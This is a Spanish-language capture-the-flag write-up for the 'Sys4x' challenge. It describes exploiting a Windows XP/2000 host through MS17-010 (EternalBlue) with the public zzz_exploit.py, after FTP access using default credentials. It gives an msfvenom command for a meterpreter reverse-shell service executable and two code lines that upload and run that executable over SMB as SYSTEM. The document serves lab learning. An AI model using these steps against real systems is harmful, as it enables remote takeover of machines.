### Sys4x - 200 Points
#### Exploit and gain root privileges on the box and look for the flag.txt inside the file system. You will have to proof that you have successfully exploited at least one service on the box with a self made exploit,.

##### Category: Hacking + Exploiting 
##### Solves: 5 

Esta máquina (192.168.0.13) era muy similar a FTxP (192.168.0.11), ya que tras acceder al servidor FTP con las credenciales “admin/admin”, vimos que el contenido era prácticamente el mismo. Aún y así, nos encontramos con la misma situación, no sabíamos donde estaba el archivo que contenía el flag y en esta ocasión se utilizaba “Sysax Multi Server” como servidor FTP, por lo que no se podía utilizar el mismo exploit que la vez anterior.

![sysax1](https://user-images.githubusercontent.com/38633962/42779670-5efe133a-8941-11e8-88e3-a87e9f70d0ac.png)

Tras intentar buscar vulnerabilidades en los diversos servicios publicados que nos permitieran acceso a la máquina, identificamos que el sistema Windows parecía ser vulnerable al “pack” de vulnerabilidades “EternalX” (MS17-010), en concreto a Eternalblue, por lo que procedimos a explotar dicha vulnerabilidad para conseguir ejecución de comandos en el sistema.

Como el sistema operativo parecía ser un WinXP/Win2000, utilizamos el exploit “zzz_exploit.py” (https://github.com/worawit/MS17-010), el cual permite la ejecución de comandos con permisos de SYSTEM a través de SMB en estos sistemas.

Puesto que el exploit por defecto tan solo crea un archivo txt en el sistema como POC, se realizaron algunos pasos extra para conseguir nuestro objetivo. 

1. Crear un ejecutable de meterpreter como servicio de Windows que nos abra una shell reversa con nuestro equipo a través del módulo “multi/handler” de Metasploit:

      ```msfvenom -f exe-service -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=4455 > met_101_4455```

2. Se añadió la siguiente línea a la función “smb_pwn” de “zzz_exploit.py” para subir nuestra shell reversa al servidor vulnerable, en concreto a “C:\”:
	
      ```smb_send_file(smbConn, <path_de_met_101_4455.exe>", 'C', '/met_101_4455.exe')```

3. Se añadió la siguiente línea a la función “smb_pwn” de “zzz_exploit.py” para ejecutar la shell reversa:
	
      ```service_exec(conn, r'cmd /c c:\met_101_4455.exe')```

Una vez ejecutado nuestro exploit y conseguida la shell reversa, se localizó el archivo que contenía el flag en “C:\sysaxflag.txt”.

![sysax2](https://user-images.githubusercontent.com/38633962/42779786-af0c058a-8941-11e8-890a-c37280fbea43.png)
